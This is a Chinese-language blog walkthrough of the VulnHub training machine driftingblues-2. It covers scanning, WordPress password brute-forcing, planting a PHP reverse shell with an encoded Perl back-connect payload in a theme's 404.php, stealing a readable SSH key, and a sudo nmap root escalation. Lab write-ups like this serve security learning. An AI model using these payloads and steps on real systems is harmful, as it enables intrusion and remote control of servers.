<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>vulnhub靶场之driftingblues-2 - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/628768c2e3d89d49f3c95bd3217d3e9b/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="vulnhub靶场之driftingblues-2">
  <meta property="og:description" content="一.环境搭建 1.靶场描述 get flags difficulty: easy about vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email (it should be on my profile) for troubleshooting or questions. This works better with VirtualBox rather than VMware 2.靶场下载 https://www.vulnhub.com/entry/driftingblues-2,634/ 3.靶场启动 虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0/24
二.信息收集 1.寻找靶场真实ip nmap -sP 192.168.1.0/24 arp-scan -l 靶场真实ip地址为192.168.1.7 2.探测端口及服务 nmap -p- -sV 192.168.1.7 发现开启了21端口，服务为ProFTPD 发现开启了22端口，服务为OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0) 发现开启了80端口，服务为Apache httpd 2.4.38 ((Debian)) 3.">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-28T11:51:03+08:00">
    <meta property="article:modified_time" content="2024-03-28T11:51:03+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">vulnhub靶场之driftingblues-2</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 id="一-环境搭建">一.环境搭建</h2> 
<h3 id="1-靶场描述">1.靶场描述</h3> 
<pre><code>get flags
difficulty: easy
about vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email (it should be on my profile) for troubleshooting or questions.
This works better with VirtualBox rather than VMware </code></pre> 
<pre></pre> 
<h3 id="2-靶场下载">2.靶场下载</h3> 
<pre><code>https://www.vulnhub.com/entry/driftingblues-2,634/</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205182951811" height="778" src="https://images2.imgbox.com/bc/c8/hHdDwuig_o.png" width="1200"></p> 
<h3 id="3-靶场启动">3.靶场启动</h3> 
<p></p> 
<p class="img-center"><img alt="image-20240205183030629" height="634" src="https://images2.imgbox.com/d6/56/7HtQC8ci_o.png" width="1200"></p> 
<p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0/24</p> 
<h2 id="二-信息收集">二.信息收集</h2> 
<h3 id="1-寻找靶场真实ip">1.寻找靶场真实ip</h3> 
<pre><code>nmap -sP 192.168.1.0/24</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205183345515" height="311" src="https://images2.imgbox.com/c8/b2/Tg8OpZci_o.png" width="1200"></p> 
<pre><code>arp-scan -l</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205183416768" height="340" src="https://images2.imgbox.com/2f/93/vKXQuqaz_o.png" width="1200"></p> 
<pre><code>靶场真实ip地址为192.168.1.7</code></pre> 
<pre></pre> 
<h3 id="2-探测端口及服务">2.探测端口及服务</h3> 
<pre><code>nmap -p- -sV 192.168.1.7</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205183650442" height="339" src="https://images2.imgbox.com/c3/4b/ThDJWdR6_o.png" width="1198"></p> 
<pre><code>发现开启了21端口，服务为ProFTPD
发现开启了22端口，服务为OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
发现开启了80端口，服务为Apache httpd 2.4.38 ((Debian))</code></pre> 
<pre></pre> 
<h3 id="3-web指纹识别">3.web指纹识别</h3> 
<pre><code>whatweb -v http://192.168.1.7</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205183911341" height="460" src="https://images2.imgbox.com/69/0a/MXEbYe0x_o.png" width="1200"></p> 
<h2 id="三-渗透测试">三.渗透测试</h2> 
<h3 id="1-访问web服务">1.访问web服务</h3> 
<pre><code>http://192.168.1.7</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205184012854" height="819" src="https://images2.imgbox.com/bb/d9/sHAvFzkW_o.png" width="1200"></p> 
<pre><code>ftp://192.168.1.7</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205185022506" height="259" src="https://images2.imgbox.com/06/7d/ql30bG9o_o.png" width="932"></p> 
<p>我们看到是一张图片，可能会有有用的信息，我们一会分析下</p> 
<h3 id="2-扫描web服务">2.扫描web服务</h3> 
<h4 id="1-棱洞3-0指纹识别">1)棱洞3.0指纹识别</h4> 
<pre><code>./EHole_linux_amd64 finger -u http://192.168.1.7</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205184152926" height="233" src="https://images2.imgbox.com/44/c7/Dc3QeXwr_o.png" width="852"></p> 
<p>没有有用信息</p> 
<h4 id="2-nikto扫描网站结构">2)nikto扫描网站结构</h4> 
<pre><code>nikto -h http://192.168.1.7</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205184510672" height="504" src="https://images2.imgbox.com/5e/78/ZT1sqBZj_o.png" width="1200"></p> 
<p>扫描到一个登录页面，我们进行查看</p> 
<pre><code>http://192.168.1.7/blog/wp-login.php</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205184636745" height="718" src="https://images2.imgbox.com/e5/de/RQ4us3ho_o.png" width="1200"></p> 
<pre><code>我们看到cms框架是wordpress，可能是爆破用户名和密码</code></pre> 
<pre></pre> 
<h4 id="3-disearch目录扫描">3)disearch目录扫描</h4> 
<pre><code>dirsearch -u 192.168.1.7 -e * -x 403 --random-agent</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205184741763" height="441" src="https://images2.imgbox.com/1b/9d/fx7lX8rR_o.png" width="1200"></p> 
<p>扫描到一个/blog/目录，我们进行访问</p> 
<pre><code>http://192.168.1.7/blog</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205184812353" height="727" src="https://images2.imgbox.com/14/e0/KE4NNI3z_o.png" width="1200"></p> 
<pre><code>目前掌握的信息是一个登录页面，一个/blog/目录,一张图片</code></pre> 
<pre></pre> 
<h3 id="3-渗透测试">3.渗透测试</h3> 
<h4 id="1-图片隐写">1)图片隐写</h4> 
<p>我们分析这张图片</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205185421131" height="646" src="https://images2.imgbox.com/d2/83/5CaJYZjj_o.png" width="1014"></p> 
<p>使用steghide工具先查看一下图片基本信息,但是需要密码，我们没有密码</p> 
<pre><code>steghide --info '/home/kali/桌面/secret.jpg' </code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205185545378" height="223" src="https://images2.imgbox.com/43/09/lV58xGeq_o.png" width="870"></p> 
<p>我们使用stegseek进行爆破</p> 
<pre><code>stegseek  --crack '/home/kali/桌面/secret.jpg' </code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205190135123" height="281" src="https://images2.imgbox.com/02/00/mU4l2ctr_o.png" width="815"></p> 
<p>我们看到没有爆破出来，我们换一个思路，前面我们扫描到cms框架是wordpress，我们可以使用wpscan进行爆破</p> 
<h4 id="2-wpscan爆破">2)wpscan爆破</h4> 
<p>爆破用户名</p> 
<pre><code>wpscan --url http://192.168.1.7/blog  -e u</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205191446215" height="446" src="https://images2.imgbox.com/ff/50/ADoZDsiN_o.png" width="1135"></p> 
<p></p> 
<p class="img-center"><img alt="image-20240205191507965" height="410" src="https://images2.imgbox.com/a9/f5/jaxAOvlV_o.png" width="1200"></p> 
<p>爆破出来一个用户名是albert</p> 
<p>制作字典</p> 
<pre><code>cewl http://192.168.1.7 &gt; MS02423.txt</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205191747850" height="525" src="https://images2.imgbox.com/e4/e6/uhQwz2yZ_o.png" width="1200"></p> 
<p>爆破密码</p> 
<pre><code>sudo wpscan --url http://192.168.1.7/blog  albert --passwords  MS02423.txt</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205191943220" height="279" src="https://images2.imgbox.com/52/4f/Kccgk0sc_o.png" width="1200"></p> 
<p>我们看到没有爆破出来，我们换一个字典,使用kali自带的字典——rockyou.txt</p> 
<pre><code>sudo wpscan --url http://192.168.1.7/blog  albert --passwords  /usr/share/wordlists/rockyou.txt</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205192554205" height="311" src="https://images2.imgbox.com/06/14/hXwmjBMy_o.png" width="1200"></p> 
<pre><code>用户名是albert,密码是scotland1</code></pre> 
<pre></pre> 
<h4 id="3-登录wordpress">3)登录wordpress</h4> 
<pre><code>http://192.168.1.7/blog/wp-login.php</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205192337005" height="719" src="https://images2.imgbox.com/75/2e/aQgD6PiC_o.png" width="1200"></p> 
<p>我们看到报错了，看来是ip和域名没有绑定，我们进行绑定</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205192500303" height="278" src="https://images2.imgbox.com/d7/17/1FlE0Hsq_o.png" width="738"></p> 
<p>我们再次访问,发现登录成功了</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205192753051" height="668" src="https://images2.imgbox.com/fd/05/TXLxmzxB_o.png" width="1200"></p> 
<p></p> 
<p class="img-center"><img alt="image-20240205192847079" height="770" src="https://images2.imgbox.com/41/c7/wwcMlagI_o.png" width="1200"></p> 
<h4 id="4-反弹shell">4)反弹shell</h4> 
<p>我们进行查看，查找可以写入shell的地方，找到有一个404.php的页面可以编辑，此处使用php反弹shell的脚本，只需要修改ip和port为指定的值即可.</p> 
<pre><code>http://driftingblues.box/blog/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwentyone</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205192943683" height="809" src="https://images2.imgbox.com/4f/6a/zsTFKpIu_o.png" width="1200"></p> 
<p>我们写入php反弹shell脚本，记得保存</p> 
<pre><code>&lt;?php
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr);
	}
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
			} 
			elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
			} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
$yourip = "your IP";
$yourport = 'your port';
$usedb = array('perl'=&gt;'perl','c'=&gt;'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;");
?&gt;</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205193435417" height="621" src="https://images2.imgbox.com/13/d8/I2ICtEPb_o.png" width="1200"></p> 
<p>然后，我们访问一个不存在的页面即可</p> 
<pre><code>http://driftingblues.box/blog/index.php/MS02423</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205193750358" height="437" src="https://images2.imgbox.com/14/d4/JTn9khdO_o.png" width="1200"></p> 
<p>我们看到反弹成功</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205193902136" height="292" src="https://images2.imgbox.com/08/69/gfdw3EXe_o.png" width="1200"></p> 
<h4 id="5-提权">5)提权</h4> 
<p>我们使用sudo -l 查看提权，发现需要密码</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205194048378" height="346" src="https://images2.imgbox.com/96/44/CLt0P3Vy_o.png" width="1080"></p> 
<p>我们查看一些目录——/home/,/tmp/,/var,/var/www/html</p> 
<p>我们切换的/home/,发现一个用户freddie，进入用户目录，有一个txt文件，但没有权限查看</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205194257431" height="521" src="https://images2.imgbox.com/af/ed/48noIImx_o.png" width="1200"></p> 
<p>我们还看到.ssh文件夹, 进入.ssh文件夹中，发现一对公私钥对，其中私钥有可读权限</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205194500332" height="264" src="https://images2.imgbox.com/17/0b/SYSeexzc_o.png" width="1200"></p> 
<p>我们复制到kali里面，并修改权限为400</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205194635713" height="625" src="https://images2.imgbox.com/03/31/5PtxFPJB_o.png" width="1200"></p> 
<p>使用私钥免密登录，可以成功登录为用户freddie,我们可以看到登录成功</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205194813153" height="421" src="https://images2.imgbox.com/1e/5a/MAyRJ1u7_o.png" width="1051"></p> 
<p>得到第一个flag</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205194845378" height="581" src="https://images2.imgbox.com/eb/de/vyNjrXQm_o.png" width="1194"></p> 
<p>查看sudo权限的命令，发现有一个nmap命令可以无密码root使用，用于提权</p> 
<pre><code>sudo -l</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205195052568" height="175" src="https://images2.imgbox.com/e5/86/vkxVI7eG_o.png" width="1200"></p> 
<p>根据使用nmap提权的方法：</p> 
<pre><code>https://gtfobins.github.io/gtfobins/nmap/</code></pre> 
<pre></pre> 
<p>进行提权</p> 
<p></p> 
<p class="img-center"><img alt="image-20240205195214901" height="587" src="https://images2.imgbox.com/c5/5d/GhTmSQ7V_o.png" width="1200"></p> 
<pre><code>TF=$(mktemp)
echo 'os.execute("/bin/sh")' &gt; $TF
sudo nmap --script=$TF</code></pre> 
<pre></pre> 
<p></p> 
<p class="img-center"><img alt="image-20240205195432631" height="709" src="https://images2.imgbox.com/4a/2a/EANqHOaa_o.png" width="1200"></p> 
<h2 id="四-相关知识">四.相关知识</h2> 
<p>1.靶场下载地址</p> 
<p>2.nmap</p> 
<p>3.arp-scan</p> 
<p>4.masscan</p> 
<p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解</p> 
<p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win）</p> 
<p>7.nikto工具的使用</p> 
<p>8.dirsearch目录扫描</p> 
<p>9.ssh登录</p> 
<p>10.图片隐写</p> 
<p>11.wpscan爆破</p> 
<p>12.nmap提权方式</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4eed4faa18a88285e22d42d9f60c7a8c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">网络空间测绘系统的商业应用</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/e2da79ea2e40f4329328ee05c6258544/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">aidl文件生成Java、C&#43;&#43;[android]、C&#43;&#43;[ndk]、Rust接口</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>